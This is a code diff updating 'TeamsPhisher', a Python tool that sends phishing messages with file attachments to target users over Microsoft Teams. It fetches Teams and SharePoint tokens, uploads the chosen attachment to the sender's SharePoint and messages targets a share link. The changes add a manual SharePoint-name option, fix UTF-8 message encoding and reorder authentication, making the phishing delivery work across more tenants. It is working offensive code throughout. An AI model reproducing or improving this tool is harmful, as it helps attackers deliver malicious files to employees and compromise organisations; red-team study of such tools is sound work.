@@ -24,7 +24,7 @@ useragent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gec
 fd = None
 
 # version: TeamsPhisher version used in banner
-__version__ = "1.0"
+__version__ = "1.1"
 
 def p_err(msg, exit):
     output = Fore.RED + "[-] " + msg + Style.RESET_ALL
@@ -121,16 +121,21 @@ def getBearerToken(username, password, scope):
     
     result = None
 
-    # If scope was passed in as a dictionary, we are fetching our sharepoint bearer and need to assemble the URL using the tenant name
-    if isinstance(scope, dict):
-        p_task("Fetching Bearer token for SharePoint...")
-        scope = 'https://%s-my.sharepoint.com/.default' % scope.get('tenantName')
-    else:
+    # If this string was passed in for scope, we are grabbing our initial Bearer token
+    if scope == "https://api.spaces.skype.com/.default":
         p_task("Fetching Bearer token for Teams...")
 
-    # If scope was passed in as a dictionary, we are fetching our sharepoint bearer and need to assemble the URL using the tenant name
-    if isinstance(scope, dict):
-        scope = 'https://%s-my.sharepoint.com/.default' % scope.get('tenantName')
+    # If scope doesn't match the above, we are fetching our Sharepoint Bearer
+    else:
+        p_task("Fetching Bearer token for SharePoint...")
+
+        # If scope was passed in as a dictionary, we are assembling our sharepoint domain automagically using the UPN from senderInfo
+        if isinstance(scope, dict):
+            scope = 'https://%s-my.sharepoint.com/.default' % scope.get('tenantName')
+        
+        # Otherwise scope was passed in as a user-defined option
+        else:
+            scope = 'https://%s-my.sharepoint.com/.default' % scope
 
     #Values hardcoded for corporate/part of organization users
     app = PublicClientApplication( "1fec8e78-bce4-4aaf-ab1b-5451cc387264", authority="https://login.microsoftonline.com/%s" % getTenantID(username) )
@@ -226,6 +231,7 @@ def getSenderInfo(bearer):
             break
 
     # Add tenantName to our senderInfo data for later
+    # Populating tenantName by parsing UPN because ran into issues where peoples 'Organization Name' differed from their 'Initial Domain Name'
     if senderInfo:
         senderInfo['tenantName'] = senderInfo['userPrincipalName'].split("@")[-1].split(".")[0]
         p_success("SUCCESS!")
@@ -241,7 +247,12 @@ def authenticate(args):
         bToken = getBearerToken(args.username, args.password, 'https://api.spaces.skype.com/.default')
         skypeToken = getSkypeToken(bToken)
         senderInfo = getSenderInfo(bToken)
-        sharepointToken = getBearerToken(args.username, args.password, senderInfo)
+
+        # Fetch sharepointToken passing in alternate vars for scope depending on whether specified a specific sharepoint domain to use.
+        if args.sharepoint:
+            sharepointToken = getBearerToken(args.username, args.password, args.sharepoint)
+        else:
+             sharepointToken = getBearerToken(args.username, args.password, senderInfo)           
 
     # Otherwise fail
     else:
@@ -388,9 +399,9 @@ def sendFile(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSha
     headers = {
         "Authentication": "skypetoken=" + skypeToken,
         "User-Agent": useragent,
-        "Content-Type": "application/json",
+        "Content-Type": "application/json, Charset=UTF-8",
         "Origin": "https://teams.microsoft.com",
-        "Referer": "https://teams.microsoft.com/"
+        "Referer": "https://teams.microsoft.com/",
     }
 
     # Format supplied message to be json friendly
@@ -427,8 +438,8 @@ def sendFile(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSha
         }
     }""" % (assembledMessage, uploadInfo.get('sharepointIds').get('listItemUniqueId'), senderSharepointURL, senderDrive, attachment.split(".")[-1], os.path.basename(attachment), senderSharepointURL, senderDrive, os.path.basename(attachment), uploadInfo.get('sharepointIds').get('listItemUniqueId'), os.path.basename(attachment), attachment.split(".")[-1], senderSharepointURL, senderDrive, os.path.basename(attachment), senderSharepointURL, senderDrive, inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('Url'), inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('ShareId'))
     
-    #Create chat thread
-    content = requests.post(url, headers=headers, data=body)
+    # Send Message
+    content = requests.post(url, headers=headers, data=body.encode(encoding='utf-8'))
 
     if content.status_code != 201:
         p_warn("Error sending message + attachment to user: %d" % (content.status_code))
@@ -566,6 +577,7 @@ if __name__ == "__main__":
     parser.add_argument('-p', '--password', dest='password', type=str, required=True, help='Password for authentication')
     parser.add_argument('-a', '--attachment', dest='attachment', type=str, required=True, help='Full path to the attachment to send to targets.')
     parser.add_argument('-m', '--message', dest='message', type=str, required=True, help='A file containing a message to send with attached file.')
+    parser.add_argument('-s', '--sharepoint', dest='sharepoint', type=str, required=False, help='Manually specify sharepoint name (e.g. mytenant.sharepoint.com would be --sharepoint mytenant)')  
     
     # Target group. Choose either a single email or a list of emails.
     parser_target_group = parser.add_mutually_exclusive_group(required=True)
@@ -613,6 +625,11 @@ if __name__ == "__main__":
             Greeting = args.greeting
         p_success("Using greeting: %s, --personalize greeting: %s <Name>," % (Greeting, Greeting))
     
+    if args.sharepoint:
+        p_success("Using manually specified sharepoint name: %s" % (args.sharepoint))
+    else:
+        p_warn("Resolving sharepoint name automatically- if your tenant uses a custom domain you might have issues!")
+
     if args.log:
         p_success("Logging TeamsPhisher output at: %s" % (logfile))
     else:
@@ -659,9 +676,6 @@ if __name__ == "__main__":
         except:
             p_err("Could not read supplied list of emails!", True)
 
-    # Authenticate and fetch our tokens and sender info
-    bToken, skypeToken, sharepointToken, senderInfo = authenticate(args)
-
     # Check to make sure attachment file exists
     if not os.path.isfile(args.attachment):
         p_err("Cannot locate %s!" % (args.attachment), True)
@@ -670,9 +684,17 @@ if __name__ == "__main__":
     if not os.path.isfile(args.message):
         p_err("Cannot locate %s!" % (args.message), True)
 
+    # Authenticate and fetch our tokens and sender info
+    bToken, skypeToken, sharepointToken, senderInfo = authenticate(args)
+
     # Assemble Sharepoint name + Senders drive for later use
-    senderSharepointURL = "https://%s-my.sharepoint.com" % senderInfo.get('tenantName')
-    senderDrive = senderInfo.get('userPrincipalName').replace("@", "_").replace(".", "_").lower()
+    # If user-specified sharepoint was provided, assemble using that value otherwise do so using senderInfo
+    if args.sharepoint:
+        senderSharepointURL = "https://%s-my.sharepoint.com" % (args.sharepoint)
+        senderDrive = "%s_%s_onmicrosoft_com" % (args.username.split("@")[0], args.sharepoint)
+    else:
+        senderSharepointURL = "https://%s-my.sharepoint.com" % senderInfo.get('tenantName')
+        senderDrive = senderInfo.get('userPrincipalName').replace("@", "_").replace(".onmicrosoft", "_onmicrosoft").replace(".com", "_com").lower()
 
     # Upload file to sharepoint that will be sent as an attachment in chats
     uploadInfo = uploadFile(sharepointToken, senderSharepointURL, senderDrive, args.attachment)
